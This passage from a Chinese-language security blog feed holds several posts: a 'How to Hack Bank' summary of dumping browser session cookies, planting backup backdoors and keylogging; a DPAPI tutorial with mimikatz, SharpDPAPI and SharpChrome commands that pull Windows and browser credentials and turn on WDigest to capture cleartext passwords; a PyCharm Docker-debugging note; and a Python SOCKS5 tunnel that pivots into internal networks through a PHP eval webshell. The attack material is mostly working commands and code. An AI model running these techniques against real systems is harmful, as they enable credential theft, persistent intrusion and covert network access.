%H:%M')</span><span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>How to Hack Bank</title>
      <link href="/2020/04/22/how-to-hack-bank.html"/>
      <url>/2020/04/22/how-to-hack-bank.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p></blockquote><h3 id="从浏览器dump登陆Cookie"><a href="#从浏览器dump登陆Cookie" class="headerlink" title="从浏览器dump登陆Cookie"></a>从浏览器dump登陆Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browserstrings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nulfindstr PHPSESSID * .dmp&gt; tmpstrings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="准备后路"><a href="#准备后路" class="headerlink" title="准备后路"></a>准备后路</h3><ol><li>常用的操作用一个后门</li><li>留一个备用的后门，第一个失效之后启用</li></ol><h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>用到一下模块:</p><pre class="line-numbers language-none"><code class="language-none">MSF每5s截屏:post&#x2F;windows&#x2F;gather&#x2F;screen_spy再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。使用Windows自带的PSR截屏：psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;Start-Sleep -s 20;psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later Irealized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue living that way. So I began to spend more time away from my computer, with other people, learning to open myself to the world, to feel my emotions, to connect with others, to accept risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Fun </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通过DPAPI获取windows身份凭证</title>
      <link href="/2020/04/13/dpapi-pass-dump.html"/>
      <url>/2020/04/13/dpapi-pass-dump.html</url>
      
        <content type="html"><![CDATA[<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:</p><ul><li>IE、Chrome密码登陆表单的自动完成</li><li>邮箱客户端用户密码</li><li>FTP管理账户密码</li><li>远程桌面身份密码</li><li>……</li></ul><p>查找本地的Credentials:<br>通常的保存位置:</p><ul><li><code>%appdata%\Microsoft\Credentials</code></li><li><code>%localappdata%\Microsoft\Credentials</code></li><li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li></ul><p>因为文件被隐藏，命令行下需要查看需要加上<code>/a</code>可以看到:</p><pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="获取GUID"><a href="#获取GUID" class="headerlink" title="获取GUID"></a>获取GUID</h3><pre class="line-numbers language-none"><code class="language-none"># 打印结构体信息mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">**BLOB**  dwVersion          : 00000001 - 1  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;  dwMasterKeyVersion : 00000001 - 1  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;  dwFlags            : 20000000 - 536870912 (system ; )  dwDescriptionLen   : 00000012 - 18  szDescription      : 本地凭据数据  algCrypt           : 00006610 - 26128 (CALG_AES_256)  dwAlgCryptLen      : 00000100 - 256  dwSaltLen          : 00000020 - 32  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc  dwHmacKeyLen       : 00000000 - 0  pbHmackKey         :   algHash            : 0000800e - 32782 (CALG_SHA_512)  dwAlgHashLen       : 00000200 - 512  dwHmac2KeyLen      : 00000020 - 32  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51  dwDataLen          : 00002a70 - 10864  pbData             : xxxxxxz  dwSignLen          : 00000040 - 64  pbSign             : xxxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>guidMasterKey指向MasterKey的索引,是凭据的GUID，</p><h3 id="获取MasterKey"><a href="#获取MasterKey" class="headerlink" title="获取MasterKey"></a>获取MasterKey</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::dpapi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Authentication Id : 0 ; 374001 (00000000:0005b4f1)Session           : RemoteInteractive from 2User Name         : AdministratorDomain            : PC-201908211659Logon Server      : PC-201908211659Logon Time        : 2020&#x2F;3&#x2F;22 14:23:45SID               : S-1-5-21-4128703178-143578513-755070304-500 [00000000] * GUID      :&#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125; * Time      :2020&#x2F;4&#x2F;13 10:45:31 * MasterKey :1d30e724aab2b4ee5c83707c5xxx * sha1(key) :xxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据<code>GUID:&#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;</code>找到关联的Masterkey, 这个MasterKey就是加密的密钥</p><p>###解密<br>根据找到的Credentials和MaterKey,使用mimikatz解密:</p><pre class="line-numbers language-none"><code class="language-none">mimikatz dpapi::cred &#x2F;in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\&lt;Credentials&gt; &#x2F;masterkey:&lt;MasterKey&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="sharpDPAPI"><a href="#sharpDPAPI" class="headerlink" title="sharpDPAPI"></a>sharpDPAPI</h4><p>自动化利用工具，一键dump，在CNA脚本中修改<code>$SharpDPAPI::AssemblyPath</code>为本机器上面sharpDPAPI.exe的绝对路径，不用上传到目标机器上面，然后:</p><pre class="line-numbers language-none"><code class="language-none"># dump出来masterKeysekurlsa::dpapi# 查看已经缓存的keydpapi::cache# 一键dumpshareDPAPI -dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外可以使用<code>SharepChrome</code>来导出Chrome的密码和历史记录，可以配合<code>SharepWeb</code>导出firefox、EDGE浏览器的信息等</p><pre class="line-numbers language-none"><code class="language-none">SharpChrome.exe cookies &#x2F;target:&quot;C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Cookies&quot; &#x2F;unprotectSharpChrome.exe logins &#x2F;target:&quot;C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; &#x2F;unprotect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="高版本限制"><a href="#高版本限制" class="headerlink" title="高版本限制"></a>高版本限制</h4><p>在win10和2012R2以上的时候，默认内存缓存中禁止保存明文密码,需要开启wdigest Auth:</p><ul><li>cmd</li></ul><pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>powershell</li></ul><pre class="line-numbers language-none"><code class="language-none">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>关闭命令:</li></ul><pre class="line-numbers language-none"><code class="language-none">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启之后，需要管理员重新登陆才可以抓明文密码:</p><pre class="line-numbers language-none"><code class="language-none">rundll32 user32.dll,LockWorkStationmimikatz:sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="https://xz.aliyun.com/t/6508">https://xz.aliyun.com/t/6508</a></li><li><a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials">https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials</a></li><li><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey/</a></li><li><a href="https://github.com/djhohnstein/SharpWeb">https://github.com/djhohnstein/SharpWeb</a></li><li><a href="https://github.com/djhohnstein/SharpChromium">https://github.com/djhohnstein/SharpChromium</a></li><li><a href="https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107">https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pycharm远程调试Docker</title>
      <link href="/2019/12/13/python-debug.html"/>
      <url>/2019/12/13/python-debug.html</url>
      
        <content type="html"><![CDATA[<p>调试的流水账:</p><p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p><pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没毛病就表示安装成功。</p><p>这个pycharm的包一般在这个目录:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后配置pycharm:</p><pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p><p>在Run/Debug configurations里面，选择添加Python Remote Debug。</p><p>其中的<code>local host name</code>要设置为pycharm机子的IP，PORT随便填，比如11000。<br>设置完成之后，注意设置下Path Mappings，设置好本地主机的路径源代码和远程的路径。如果这里不设置好，在调试的时候Py</p><p>最后把两行代码加到要debug的机子文件上,注意把pycharm-debug.egg添加到路径里面:</p><pre class="line-numbers language-none"><code class="language-none">import syssys.path.append(&#39;&#x2F;root&#x2F;pycharm-debug.egg&#39;)import pydevdpydevd.settrace(&#39;192.168.140.40&#39;, port&#x3D;10000, stdoutToServer&#x3D;True, stderrToServer&#x3D;True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个时候已经设置全部完成，本地的pycharm启动远程调试，然后在docker上面启动Python应用。</p><p>如果不确定本地的pycharm是不是启动成功了，可以telnet一下对应的端口，会有类似这种内容出现:</p><p><img src="../output/images/15762160114084.jpg"></p><pre class="line-numbers language-none"><code class="language-none">strace -p 27691 -e trace&#x3D;read,write -s 1024<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>调试的时候可以看读写调用。</p><h3 id="SSH-Remote-Debug"><a href="#SSH-Remote-Debug" class="headerlink" title="SSH Remote Debug"></a>SSH Remote Debug</h3><p>如果是ssh的Remote Debug，在设置interpreter的时候，设置远程服务器的python解释器就可以了，在Docker里面之所以ssh类型的远程调试失败，应该是Docker的端口没有映射到本地造成的。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP Eval HTTP Proxy</title>
      <link href="/2019/10/23/php-eval-proxy.html"/>
      <url>/2019/10/23/php-eval-proxy.html</url>
      
        <content type="html"><![CDATA[<p>背景: linux，php环境下的reGeorg不可用。<br>目标: 分析reGeorg的原理尝试改一下<br>结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis</p><pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle  HTTP based protocol:    Elastic, CouchDB, Mongodb, Docker  Text-based protocol:    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h3><p>这个脚本是个残的:</p><pre class="line-numbers language-none"><code class="language-none">#coding: utf-8import socketimport binasciiimport requestsheaders &#x3D; &#123;&quot;Host&quot;: &quot;&quot;,&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,&quot;Connection&quot;: &quot;close&quot;&#125;url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)s.bind((&quot;127.0.0.1&quot;,8889))s.listen(5)sock, addr_info &#x3D; s.accept()while True:    print &#39;Connect by &#39;, addr_info    data &#x3D; sock.recv(102400)    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;    print payload    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content    print data2    print &quot;sending data&quot;    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p><p>绑定本机的8889端口，然后mongo直接连,<code>mongo --port 8889</code>,如果想观察之间的流量可以这样做:</p> <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;监听8889socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;流量肉眼可以看mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的<code>子集</code>，因为如果要访问端口之类的就需要改脚本了。</p><p>看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:</p><pre class="line-numbers language-none"><code class="language-none">Connect: 连接之后生成一个cookieForward: 把要请求的数据包放在cookie里面的writebufRead: Regeorg的脚本读取writbuf的数据包之后请求接口服务，比如curl访问内网端口。然后把结果写入到cookie里面的readbuf，读取readbuf的内容Disconnect: 把cookie里面的run标志变为false，cookie就不再使用了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以当Regeorg不能使用的时候，比如第一步的connect无法生成。<br>上面脚本的过程是这样子的: 我看了看regeorg的源代码，百思不得其解为什么connect没生成，调试了几天没结果。（好菜.jpg)，这个时候我发现regeorg的php原理基本就是上面的步骤。所以我就手动写脚本尝试可行。</p><p>有一个不知道是什么坑的问题: 当我把ip作为变量发送到远程服务器的时候，远程服务器会出现epool_wait的错误。但是当整个脚本放在远程服务器的时候就可以运行了。</p><pre class="line-numbers language-none"><code class="language-none">失败:&lt;?php$ip &#x3D; $_POST[&#39;ip&#39;];$port &#x3D; $_POST[&#39;port&#39;];$com &#x3D; $_POST[&#39;command&#39;];$payload &#x3D; $com.&#39;\r\n&#39;;$res &#x3D; fsockopen($ip,(int)$port,$errno, $errstr);&#x2F;&#x2F;$res &#x3D; stream_socket_client(&quot;tcp:&#x2F;&#x2F;127.0.0.1:6379&quot;, $errno, $errstr);var_dump($res);stream_set_timeout(1);stream_set_blocking(false);fwrite($res,$raw);while ($o&#x3D;fgets($res,5))&#123;$readbuf .&#x3D; $o;&#125;var_dump($readbuf);fclose($res);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">成功:&lt;?php$res &#x3D; fsockopen(&quot;127.0.0.1&quot;,6379);$raw &#x3D; &quot;info\r\n&quot;;stream_set_timeout($res,1);stream_set_blocking(false);fwrite($res,$raw);$info &#x3D; stream_get_meta_data($res);echo $info[&#39;timed_out&#39;];while ($o &#x3D;fgets($res,5))&#123;        if($o &#x3D;&#x3D;&#x3D; false)&#123;echo &#39;false lala&#39;;&#125;$readBuff .&#x3D; $o;&#125;var_dump($readBuff);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我到了现在这一步，其实是中间发现antsword的扫描端口原理，就是包装好数据包发送到远程服务器，远程服务器做一个eval。</p><p>既然是eval了，那么就是跟xss一个原理: 你有了一个”编辑器”。</p><p>所以呢，再看看前面的regeorg的原理，剩下最后一步了，改造上面的脚本，让他适合proxychains。</p><h3 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h3><pre class="line-numbers language-none"><code class="language-none"># coding: utf-8import socketimport binasciiimport urllibimport sysimport requestsVER &#x3D; &quot;\x05&quot;METHOD &#x3D; &quot;\x00&quot;SUCCESS &#x3D; &quot;\x00&quot;SOCKFAIL &#x3D; &quot;\x01&quot;NETWORKFAIL &#x3D; &quot;\x02&quot;HOSTFAIL &#x3D; &quot;\x04&quot;REFUSED &#x3D; &quot;\x05&quot;TTLEXPIRED &#x3D; &quot;\x06&quot;UNSUPPORTCMD &#x3D; &quot;\x07&quot;ADDRTYPEUNSPPORT &#x3D; &quot;\x08&quot;UNASSIGNED &#x3D; &quot;\x09&quot;def parseSocks5(sock):    nmethods, methods &#x3D; (sock.recv(1), sock.recv(1))    # print nmethods,methods    sock.sendall(VER + METHOD)    ver &#x3D; binascii.b2a_hex(sock.recv(1))    # print &quot;ver:%s &quot; % ver  #socks version: socks5 or socks4    if ver &#x3D;&#x3D; &quot;\x02&quot;:  # this is a hack for proxychains        ver, cmd, rsv, atyp &#x3D; (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))    else:        cmd, rsv, atyp &#x3D; (sock.recv(1), sock.recv(1), sock.recv(1))    target &#x3D; None    targetPort &#x3D; None    if atyp &#x3D;&#x3D; &quot;\x01&quot;:  # IPv4                # Reading 6 bytes for the IP and Port        target &#x3D; sock.recv(4)        targetPort &#x3D; sock.recv(2)        target &#x3D; &quot;.&quot; .join([str(ord(i)) for i in target])    elif atyp &#x3D;&#x3D; &quot;\x03&quot;:  # Hostname        targetLen &#x3D; ord(sock.recv(1))  # hostname length (1 byte)        target &#x3D; sock.recv(targetLen)        targetPort &#x3D; sock.recv(2)        target &#x3D; &quot;&quot;.join([unichr(ord(i)) for i in target])    elif atyp &#x3D;&#x3D; &quot;\x04&quot;:  # IPv6        target &#x3D; sock.recv(16)        targetPort &#x3D; sock.recv(2)        tmp_addr &#x3D; []        for i in xrange(len(target) &#x2F; 2):            tmp_addr.append(unichr(ord(target[2 * i]) * 256 + ord(target[2 * i + 1])))        target &#x3D; &quot;:&quot;.join(tmp_addr)    targetPort &#x3D; ord(targetPort[0]) * 256 + ord(targetPort[1])    # print targetPort    # print target    if cmd &#x3D;&#x3D; &quot;\x02&quot;:  # BIND        raise SocksCmdNotImplemented(&quot;Socks5 - BIND not implemented&quot;)    elif cmd &#x3D;&#x3D; &quot;\x03&quot;:  # UDP        raise SocksCmdNotImplemented(&quot;Socks5 - UDP not implemented&quot;)    elif cmd &#x3D;&#x3D; &quot;\x01&quot;:  # CONNECT        serverIp &#x3D; target        serverIp &#x3D; &quot;&quot;.join([chr(int(i)) for i in serverIp.split(&quot;.&quot;)])    sock.sendall(VER + SUCCESS + &quot;\x00&quot; + &quot;\x01&quot; + serverIp + chr(targetPort &#x2F; 256) + chr(targetPort % 256))    # print &quot;recv: %s&quot; % binascii.b2a_hex(sock.recv(1024))    return target,targetPortdef sendPayload(sock,flag&#x3D;&#39;&#39;):    print &quot;[Prepare Payload]&quot;    try:        data &#x3D; sock.recv(20480)    except:        print &quot;Closing Proxy&quot;        s.close()        exit(0)    if data:        print &quot;&lt;&lt; Recving Data From Client&quot;        tmp_payload &#x3D; &quot;$res &#x3D; fsockopen(&#39;%s&#39;,%s);&quot; % (target, targetPort)        tmp_payload +&#x3D; &quot;$raw &#x3D; hex2bin(&#39;&quot; + binascii.b2a_hex(flag+data) + &quot;&#39;);&quot;        tmp_payload +&#x3D; &quot;stream_set_timeout($res,1);&quot;        # tmp_payload +&#x3D; &quot;stream_set_blocking(true);&quot;        tmp_payload +&#x3D; &quot;fwrite($res,$raw);&quot;        tmp_payload +&#x3D; &quot;while ($o &#x3D;fgets($res,100))&#123;if($o &#x3D;&#x3D;&#x3D; false)&#123;echo &#39;Connect Failed&#39;;&#125;&quot;        tmp_payload +&#x3D; &quot;$readBuff .&#x3D; $o;&#125;&quot;        tmp_payload +&#x3D; &quot;echo $readBuff;&quot;        tmp_payload +&#x3D; &quot;fclose($res);&quot;        # print tmp_payload        payload &#x3D; urllib.quote(tmp_payload)        # print &quot;The payload is: %s&quot; %payload        shell &#x3D; sys.argv[1]        p &#x3D; sys.argv[2]        exp &#x3D; &quot;%s&#x3D;%s&quot; % (p, payload)        content &#x3D; requests.post(shell, data&#x3D;exp, proxies&#x3D;&#123;&quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,                                headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;).content        sock.send(content)        print &quot;&gt;&gt; Sending Data to Client&quot;        flag2 &#x3D; sock.recv(1)        while flag2:            sendPayload(sock,flag2)        # else:        #     s.close()        #     exit(0)        # # s.close()    else:        passs &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 2)s.bind((&quot;127.0.0.1&quot;, 9999))s.listen(5)while 1:    try:        sock, addr_info &#x3D; s.accept()        print &quot;[Accept Bytes]&quot;        flag &#x3D; sock.recv(1)        if flag &#x3D;&#x3D; &quot;\x05&quot;:            target, targetPort &#x3D; parseSocks5(sock)            sendPayload(sock)        else:            sendPayload(sock,flag)    except KeyboardInterrupt:        exit(0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用方法: <code>python rego.py &lt;webshell&gt; &lt;webshell&#39;s pass&gt;</code> </p><p>这个很烂的单线程代码实现了这样的功能:</p><ol><li>开启一个本地的9999的socks5代理</li><li>使用这个代理可以用curl访问内网web服务</li><li>可以访问这些数据库，mongo可用</li><li>使用了8080作为代理，放在burp里面看流量</li></ol><p>有这样的缺点:</p><ol><li>curl访问web和访问mongo只能选一个(比如开了两个窗口，一个访问http，一个访问mongo)</li><li>速度很慢，取决于实际环境，自己调timeout</li><li>ssh或者mysql不能用，因为没有保持socks连接。</li></ol><p>为什么reGeorg就可以？因为reGeorg用<code>while true</code>循环保持了socks连接，通过写入cookie的数据进行交互。</p><p>测试主要使用了socat转发流量:</p><pre class="line-numbers language-none"><code class="language-none">socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>测试了下redis不可用，因为默认redis使用的是RESP的协议。</p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>winRM端口复用</title>
      <link href="/2019/10/23/winrm.html"/>
      <url>/2019/10/23/winrm.html</url>
      
